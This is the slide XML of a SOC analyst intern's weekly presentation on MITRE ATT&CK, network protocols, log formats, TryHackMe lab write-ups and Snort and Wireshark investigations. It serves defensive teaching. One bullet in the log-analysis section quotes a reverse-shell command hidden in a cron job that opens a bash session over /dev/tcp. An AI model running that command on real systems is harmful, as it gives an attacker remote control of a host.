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Week 2 - Networking, Log Types, Wireshark and MITRE ATT&amp;CK</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:defRPr sz="2000">
                <a:solidFill>
                  <a:srgbClr val="BFD4F2"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>DG Interns Hub - SOC Analyst Internship</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:defRPr sz="1800">
                <a:solidFill>
                  <a:srgbClr val="9FBCE6"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>10 theory notes | 6 TryHackMe writeups | 6 hands-on investigations</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:defRPr sz="1600">
                <a:solidFill>
                  <a:srgbClr val="8FAAD8"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Submitted 14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The brief and what it asked for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MITRE ATT&amp;CK - what it is and why a SOC lives in it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Tactics vs techniques, and the three ATT&amp;CK matrices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Mapping an alert to a technique - worked scenario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ATT&amp;CK vs the Cyber Kill Chain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The protocols, ports and services behind every investigation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DNS resolution and DHCP DORA, step by step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Log formats: Windows Event Log, syslog, JSON, CSV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Inbound vs outbound traffic - and what direction tells you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Lab writeups - six TryHackMe rooms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Hands-on findings - capture, traffic, logs, Apache, ATT&amp;CK, Snort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Key learnings and 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brief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What Week 2 actually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Theory: answer ten questions in my own words, one file each, using bullets and tables</a:t>
            </a:r>
          </a:p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Labs: complete six free TryHackMe rooms and write up each one separately</a:t>
            </a:r>
          </a:p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Hands-on: analyse a supplied capture, generate my own traffic, read Linux logs,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="700"/>
              </a:spcAft>
              <a:defRPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5A5A5A"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>* analyse a real Apache access log, map three behaviours to ATT&amp;CK, and build Snort</a:t>
            </a:r>
          </a:p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Reporting: a weekly PDF report, a presentation, a README and LinkedIn posts</a:t>
            </a:r>
          </a:p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Rules: no late submission, no plagiarism, free tools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Part 1 - MITRE ATT&amp;CK</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="1800">
                <a:solidFill>
                  <a:srgbClr val="BFD4F2"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Theory notes 01 to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is MITRE ATT&amp;CK?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Adversarial Tactics, Techniques and Common Knowledge - a free knowledge base from MITRE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Built from real-world observations, first released publicly in 2015 and updated continuously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It describes attacker BEHAVIOUR, not malware names or file hashes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Made of tactics, techniques, sub-techniques, procedures, groups, software, mitigations and data sources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Why the SOC needs it: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5A5A5A"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>* One shared language between analysts, hunters, detection engineers and management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5A5A5A"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>* Detection moves from fragile indicators to durable behaviour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5A5A5A"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>* Coverage becomes measurable - a heat map of what is detected and what is blind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5A5A5A"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>* Hunting is driven by real technique gaps instead of guesswork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Tactics vs Techniques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Tactic = the WHY (the goal). Technique = the HOW (the method)</a:t>
            </a:r>
          </a:p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Tactics are the columns of the matrix; techniques are the rows inside them</a:t>
            </a:r>
          </a:p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The T-ID belongs to the technique (T1059), and sub-techniques extend it (T1059.001)</a:t>
            </a:r>
          </a:p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One technique can serve several tactics; one tactic contains many techniques</a:t>
            </a:r>
          </a:p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Burglar analogy: tactic = get inside the house, technique = pick the back-door lock</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="700"/>
              </a:spcAft>
              <a:defRPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="242424"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>SOC use: the ticket records Execution / T1059.001 and everyone knows what happened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Enterprise tactics and an example technique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02 - thirteen Enterprise tactics, one technique each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Tactic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Example technique (ID)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Tactic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Example technique (ID)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Reconnaissance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T1595 Active Scanning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T1087 Account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Initial Access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T1566.001 Spearphishing Attachment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Lateral Movement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T1021.001 RDP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T1059.001 PowerShell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T1560 Archive Collected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Persistence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T1547.001 Registry Run Keys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Command and Control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T1071.001 Web Protocols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Privilege Escalation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T1068 Exploitation for PrivEsc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Exfiltration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T1041 Over C2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Defense Evasion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T1027 Obfuscated Files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T1486 Data Encrypted for Impact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Credential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T1003.001 LSASS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Resource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T1583 Acquire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three ATT&amp;CK matrices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Enterprise - Windows, Linux, macOS, cloud, network, identity. The day-to-day matrix for a normal SOC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5A5A5A"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>* 14 tactics from Reconnaissance to Impact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Mobile - Android and iOS devices and apps. Different behaviour: accessibility-service abuse,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5A5A5A"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>* malicious apps, SMS interception and MDM profile abuse instead of registry keys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ICS - industrial control systems: PLCs, RTUs, engineering workstations, plant networks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5A5A5A"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>* Extra tactics like Inhibit Response Function and Impair Process Control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5A5A5A"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>* Priority is physical safety and process availability, not data confidentiality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IDs are NOT interchangeable between matrices - always open the right one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an analyst maps an alert to a technique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04 - an 8-step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1. Read the raw evidence, not the alert title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2. Write the behaviour in one plain sentence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3. Decide the tactic - what was the attacker's goal?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4. Find the technique on attack.mitre.org and record the full path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5. Attach the log line, parent-child process, command line and timestamp as justification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6. Note the data source the detection depends on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7. Decide the action: escalate, contain, hunt, or build a rule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Golden rule: map the BEHAVIOUR to a technique - never the other way round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Worked scenario - Word spawns encoded PowerShell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04 - the mapping recorded on the ticket: Execution / T1059.001 (confirmed)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Observed behaviour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 source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Tactic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Word opens PowerShell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Sysmon 1 / 4688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T1059.001 PowerShell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-enc Base64 command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Sysmon 1 command line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Defense Evasion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T1027 Obfuscated Files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-nop -w hidden flags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Sysmon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Defense Evasion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T1562.001 Impair Defenses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HTTPS download to a public IP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Proxy logs / Sysmon 3,22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Command and Control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T1071.001 Web Protocols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Script written to %APPDATA%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File creation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T1547 Registry Run Keys (possible)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MITRE ATT&amp;CK vs the Cyber Kill Chain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05 - complementary, not competing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Cyber Kill Chain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MITRE ATT&amp;CK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Origin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Lockheed Martin, 2011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MITRE, public since 2015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Shape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Linear, 7 phases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Matrix: tactic columns, technique rows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Granularity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Coarse - seven stages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Fine - hundreds of techniques and sub-techniques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Answers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WHERE in the attack you are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WHAT the attacker did and how to detect it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Explaining an incident; perimeter defence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Detection engineering, hunting, triage,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Weakness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Too high level for cloud and fileless attacks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Large; still not exhaustive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ATT&amp;CK tactics with no Kill Chain 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Defense Evasion and Discovery have no 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Both are first-class tactics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Part 2 - Protocols and Logs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="1800">
                <a:solidFill>
                  <a:srgbClr val="BFD4F2"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Theory notes 06 to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Protocols and their default ports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06 - ports identify services; IP addresses identify hosts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Encrypted?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80/TCP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Plain-text web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HTTPS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443/TCP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Web content inside TLS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DNS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53/UDP and 53/TCP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Name resolution and other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No (usually)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DHCP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67 server, 68 client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Automatic IP, mask, gateway, DNS, lease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22/TCP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Encrypted remote shell and tunnelling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FTP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21 control, 20 data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File transfer, no encryption by default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SMTP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25, 587 submission, 465 TLS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Send and relay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Only with TLS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DNS resolution works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Step 0: the user types a name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Step 1: local caches in order - browser, OS, hosts file, stub resolver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Step 2: a recursive query goes to the recursive resolver (usually the ISP)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Step 3: the resolver checks its own cache - popular sites stop here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Step 4: root server - returns a referral to the right TLD server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Step 5: TLD server - returns a referral to the domain's authoritative nameservers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Step 6: authoritative nameserver - returns the real A / AAAA / CNAME record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Step 7: the answer is cached for its TTL and the browser connects, usually on port 443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Why the SOC cares: DNS is rarely encrypted, precedes almost every connection,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5A5A5A"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>* and is abused for tunnelling (T1071.004) and C2 over TXT records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DHCP - the DORA exchange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DISCOVER - client broadcasts from 0.0.0.0 to 255.255.255.255:67, 'is there a server?'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OFFER - every server replies with a proposed IP, mask, gateway, DNS and lease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REQUEST - the client broadcasts which offer it accepted, so others release theirs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ACKNOWLEDGE - the chosen server confirms and the client configures itself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Ports: UDP 67 on the server, UDP 68 on the client (DHCPv6 uses 546/547)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Lease lifecycle: renew at 50% (T1), rebind at 87.5% (T2), restart at expiry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Attacks: rogue DHCP server = man-in-the-middle (T1557); DHCP starvation = denial of service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Defences: DHCP snooping, port security - and lease logs, which link an IP back to a device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Comparing log formats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09 - all four carry the same five facts: time, source, user, action, result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98755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Format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Common use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Example snippet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Windows Event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Binary .evtx, fixed schema, named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Windows Security / System / Application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EventID 4625, TargetUserName apura, Status 0xC000006D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syslog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One line, RFC 3164/5424, PRI + time + host + tag + message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Linux hosts, routers, switches, firewalls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Oct 7 12:40:44 websrv sshd[2611]: Failed password for invalid user stansimon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key:value pairs, nested, one event per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Modern apps, cloud APIs, EDR, SIEM-friendly exports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{"ts":"...","user":"stansimon","src_ip":"10.10.10.55"}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CSV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Flat rows, comma separated, optional header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Spreadsheet exports, manual counting, small hand-offs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2424"/>
                          </a:solidFill>
                        </a:defRPr>
                      </a:pPr>
                      <a:r>
                        <a:t>ts,host,user,src_ip,status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Inbound vs outbound traffic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Note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Inbound = into the network, usually attacker-initiated. Outbound = out of it, usually host-initiated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Both are relative to a boundary - the same packet is outbound at the client and inbound at the server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Inbound anomalies mean attempted compromise: scans, brute force, exploit attempts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Outbound anomalies mean C2 or exfiltration - often the more urgent of the two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Always combine direction with volume, timing, destination reputation and endpoint context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Small, regular, machine-like outbound traffic = beaconing. Large off-hours uploads = exfiltration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North-south crosses the perimeter; east-west is between internal hosts, where lateral movement lives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A useful block needs four facts: direction, IP/domain, port and protocol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Part 3 - Six TryHackMe rooms</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="1800">
                <a:solidFill>
                  <a:srgbClr val="BFD4F2"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>One writeup per room, every task documented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Room 1 - Network Traffic Basics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Cyber Security 101 / SOC Level 1 - 6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Why traffic analysis exists: to see what the network is really doing, not what the inventory claims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DNS tunnelling hides C2 and stolen data inside DNS queries and TXT records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Fragmentation is an IDS evasion technique - the IDS must reassemble before it can match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TCP sequence numbers are the field that exposes session hijacking (T1557)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Endpoints generate the most traffic; Kerberos precedes SMB in a Windows domain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Three collection methods: logs, full packet capture and flow statistics - each trades retention for detail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Flags recovered: THM{FoundTheMalware} from an HTTP response body, THM{C2CommandFound} from a DNS TXT record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Rooms 2 and 3 - Intro to Logs, Intro to Log Analysis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SOC Level 1/2 - 7 and 9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A log entry needs timestamp, level, user, service and description - no timestamp means no timeline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Log types, formats and sources; the Nginx combined format is the web access-log standard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rsyslog is the Linux collection mechanism; rules live in /etc/rsyslog.d/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A reverse shell hidden in a cron job: bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/9999 0&gt;&amp;1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logrotate decides retention - 'rotate 24' plus 'hourly' is roughly one day of history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Normalisation makes sources comparable; enrichment adds the context needed to judge them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Super timeline, MITRE indicators as file hashes, path traversal decoded from %2E%2E%2F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Manual vs automated analysis: automate the known, investigate the unknown by hand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Toolbox: grep, awk, cut, sort, uniq, wc, regex, CyberChef, Sigma (YAML) and YARA (rule)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Room 4 - Snort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SOC Level 1 - 11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Snort is an open-source, rule-based NIDS/NIPS maintained by Cisco Talos and the community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IDS detects and alerts; IPS detects and acts. Families: HIDS, HIPS, NIDS, NIPS, NBA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Four operation modes: sniffer, packet logger, NIDS/NIPS, and PCAP investigation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Always validate with -T before running; build 149 in the room's VM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Rule = action + protocol + src + direction + dst + (options): msg, sid, rev, flags, id, sameip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wrote four rules: IP-ID filter, SYN flag, Push-Ack flags and same-source-destination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Every rule change needs a rev increment, and local rules use the 1000000+ sid range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Rooms 5 and 6 - DNS in Detail, HTTP in Detail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Pre Security / Cyber Security 101 - 5 and 7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424"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>DNS in Detail: the domain hierarchy (TLD, second level, subdomain), 63 chars per label, 253 total</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="700"/>
              </a:spcAft>
              <a:defRPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="242424"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Record types: A, AAAA, CNAME, MX (with priority), TXT</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="700"/>
              </a:spcAft>
              <a:defRPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="242424"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>The request path: cache, recursive resolver, root, TLD, authoritative, then cache for the TTL</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="700"/>
              </a:spcAft>
              <a:defRPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="242424"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>HTTP in Detail: HTTP is stateless; HTTPS adds TLS for confidentiality and server identity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="700"/>
              </a:spcAft>
              <a:defRPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="242424"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Methods: GET reads, POST creates, PUT updates, DELETE removes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="700"/>
              </a:spcAft>
              <a:defRPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="242424"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Status codes: 201 created, 401 not authorised, 403 forbidden, 404 not found, 503 unavailable</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="700"/>
              </a:spcAft>
              <a:defRPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="242424"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Headers are detection gold: User-Agent, Host, Content-Type, Set-Cookie</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="700"/>
              </a:spcAft>
              <a:defRPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="242424"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Cookies are sessions - stealing one is stealing the login (T1539)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Part 4 - Hands-on investigations</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="1800">
                <a:solidFill>
                  <a:srgbClr val="BFD4F2"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Six tasks, every one completed against real tools and real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1 - the supplied capture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1,171 packets over 36.88 seconds, dissected packet by packet</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="1d Top IP Convers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234440"/>
            <a:ext cx="10881360" cy="42800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</a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>SMB2 and DCE/RPC (Netlogon and DRSUAPI) between two internal hosts, plus an OpenVPN tunnel and SSDP - no HTTP over TCP and no DNS at all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1 - what the capture actually contains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The honest result is more instructive than a manufactured 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172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Question asked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Answer found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Source and destination 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192.168.100.128, 192.168.100.6, 192.168.100.1, 54.193.240.194, 239.255.255.250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HTTP requests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None over TCP. 10 SSDP 'M-SEARCH * HTTP/1.1' inside UDP port 1900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DNS queries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None - filters 'dns', 'udp.port == 53' and 'tcp.port == 53' all return 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Dominant activity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SMB (445) and MS RPC (135 / dynamic 49672) between two internal hosts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External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UDP 1194 OpenVPN to 54.193.240.194 - 15 packets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TCP flags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ACK 1078, PSH 497, SYN 132, FIN 129, RST 2 - no scan pattern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Normal internal file/RPC administration - no attack evidence in this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2 - my own traffic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Real DNS, ICMP and HTTP evidence generated and captured on the lab host</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="2a DNS Lookups - ns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467" y="1234440"/>
            <a:ext cx="4440761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</a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>A, MX, TXT and NS records answered from the local resolver - 'non-authoritative answer' proves caching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2 - filters practised and DHCP evidence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Also captured: a 7,076-byte download, HTTP 200/429 status codes and a DNS/TLS timing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70539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Filter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proves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dns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Every lookup generated: A, MX, TXT and NS for the test domain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icmp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Four echo request/reply pairs, 0% loss, TTL 246, 17-19 ms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tcp.port == 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The HTTPS conversation, including the TLS handshake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tls.handshake.type == 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The ClientHello, where the requested host name is visible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Plain HTTP only - a reminder that HTTPS bodies are invisible to Wireshark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ipconfig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42424"/>
                          </a:solidFill>
                        </a:defRPr>
                      </a:pPr>
                      <a:r>
                        <a:t>A real DHCP lease on Wi-Fi (192.168.0.205) and two APIPA 169.254.x.x addresses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4 - real Apache access log analysis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10,000 real requests analysed to answer the 'top 3 IP addresses' question</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="4a Apache Top IP Addr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527" y="1234440"/>
            <a:ext cx="6898639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</a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>1: 66.249.73.135 (482)  |  2: 46.105.14.53 (364)  |  3: 130.237.218.86 (357)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4 - the suspicious finding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404s clustered on CMS admin paths - automated reconnaissance, not bad links</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="4d Suspicious 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234440"/>
            <a:ext cx="10881360" cy="42800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</a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>208.91.156.11 produced 60 errors on WordPress paths; 91.236.75.25 probed /administrator/ on a non-Joomla site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5 - ATT&amp;CK mapping of three behaviours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Reconnaissance then Initial Access then Execution then C2 then Impact</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="5b ATTACK Tactic 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555" y="1234440"/>
            <a:ext cx="6612584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5A5A5A"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>T1595 - T1566.001 - T1059.001 - T1071.001 - T1486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5 - the mapping detail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The same act has a different ID depending on where it happens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Behaviour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Tactic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Phishing with an attachment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Initial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Phishing: Spearphishing Attachment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T1566.001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Encoded / hidden PowerShell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Execution + Defense Evasion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Command and Scripting Interpreter: PowerShell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T1059.001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Port scanning from outside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Reconnaissance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Active Scanning: IP Blocks / Vulnerability Scanning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T1595.001, T1595.002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Port scanning from inside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Network Service Discovery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T1046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Path guessing with a word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Reconnaissance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Active Scanning: Wordlist Scanning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T1595.003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3 - Linux logs, read on a real Ubuntu machine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17 sudo lines and 5 COMMAND= entries from the machine's own /var/log/auth.log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A genuine Ubuntu 22.04.5 LTS cloud image (kernel 5.15.0-198-generic) was booted as a guest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The account analyst was created and privileged commands were run through sudo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auth.log returned 44 lines, 17 of them sudo - the required finding is in there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5 COMMAND= entries: apt-get update, whoami, ls -l /root, id, grep -c /var/log/syslog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The record shape: timestamp, hostname, sudo:, user, PWD, USER=root, COMMAND=...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The same events appear in /var/log/syslog - so deleting auth.log does not delete the evidence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journalctl -u sudo returns nothing: sudo is not a systemd unit. Use journalctl -t sudo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ATT&amp;CK for that behaviour: T1548.003 Abuse Elevation Control Mechanism: Sudo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6 - Snort, and the alerts it really produced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Snort 2.9.20-WIN64 (Build 82) validated with -T, then run with -r against five real captures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9167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Capture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Alerts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Rules that fired</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr>
                    <a:solidFill>
                      <a:srgbClr val="4D78B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icmp.pcapng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ICMP echo request x1, ICMP Ping Detected x2 (request + reply)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dns_icmp.pcapng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DNS query x6, DNS response x5, ICMP x34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http.pcap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HTTP request on port 80 - HEAD, so content:"GET" correctly did not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dhcp.pcap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DHCP client messages (Discover and Request)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the supplied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42424"/>
                          </a:solidFill>
                        </a:defRPr>
                      </a:pPr>
                      <a:r>
                        <a:t>TCP SYN connection attempts from 192.168.100.128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Hands-on 6 - why the 66 can be trusted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Corroboration across Snort, Wireshark and the Python dissector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Snort's flags:S rule reports 66 TCP SYN connection attempts on the supplied capture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Wireshark's tcp.flags.syn==1 &amp;&amp; tcp.flags.ack==0 filter reports exactly the same 66 frames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The purpose-written Python dissector, reading raw TCP flag bits, also reports 66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Three independent tools agreeing is what turns a number into a finding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The required local rule: alert icmp any any -&gt; any any (msg:"ICMP Ping Detected"; sid:1000001; rev:1;)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Alert format: [generator:SID:revision] message {protocol} source -&gt; destination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Snort is signature-based: it caught 66 SYNs and zero of the SMB/DCERPC traffic, which still needed explaining by hand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learnings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Ten lessons carried forward into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ATT&amp;CK is a behaviour catalogue, not a malware catalogue - map from telemetry to technique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Tactic is the goal, technique is the method, and one technique can serve several tactics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Enterprise, Mobile and ICS exist because those environments behave, log and prioritise differently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ATT&amp;CK and the Kill Chain are complementary: the story versus the detail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Ports are strong hints, never proof - protocol mismatches are the cheapest high-signal detection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DNS is the most valuable and most abused protocol, and it is usually unencrypted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DHCP has no authentication - which is why rogue servers, snooping and lease logs matter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Direction decides meaning: inbound is attempted compromise, outbound is C2 or exfiltration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A capture only shows its own window - so DNS logging must be on before the incident</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="700"/>
              </a:spcAft>
              <a:defRPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="242424"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>The 404 is evidence: a burst of them is the fingerprint of a scanner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128016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Deliverables</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="C9D8EE"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Everything required by the brief - no placeholders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Notes/ - 10 documents, one per theory question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Writeups/ - 6 TryHackMe room writeups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Findings Folder/ - 7 documents and 52 images, every one real evidence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Week 2 Report - Weekly Work.pdf - this week's full report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Week 2 Presentation - Weekly Work.pptx - this deck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README.md - the whole week in a structured format</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="700"/>
              </a:spcAft>
              <a:defRPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="242424"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>LinkedIn Posts.md - the two required posts, ready to publish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1400"/>
              </a:spcBef>
              <a:defRPr sz="1800">
                <a:solidFill>
                  <a:srgbClr val="BFD4F2"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Week 2 - Networking, Log Types, Wireshark and MITRE ATT&amp;CK</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="1400"/>
              </a:spcBef>
              <a:defRPr sz="1800">
                <a:solidFill>
                  <a:srgbClr val="BFD4F2"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>DG Interns Hub - SOC Analyst Internship | 14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